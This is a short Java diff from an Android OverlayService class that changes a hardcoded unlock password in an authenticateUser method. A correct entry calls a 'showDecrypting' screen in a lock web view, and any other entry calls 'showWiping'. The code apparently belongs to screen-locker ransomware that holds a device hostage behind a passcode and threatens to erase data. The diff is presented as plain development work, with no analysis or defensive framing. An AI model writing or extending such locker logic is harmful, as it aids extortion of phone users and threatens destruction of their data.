@@ -125,7 +125,7 @@ public class OverlayService extends Service {
     }
 
     public void authenticateUser(String pass) {
-        if ("FR4NX".equals(pass)) {
+        if ("FR4NX.COM123".equals(pass)) {
             lockWebView.post(() -> lockWebView.evaluateJavascript("showDecrypting();", null));
         } else {
             lockWebView.post(() -> lockWebView.evaluateJavascript("showWiping();", null));
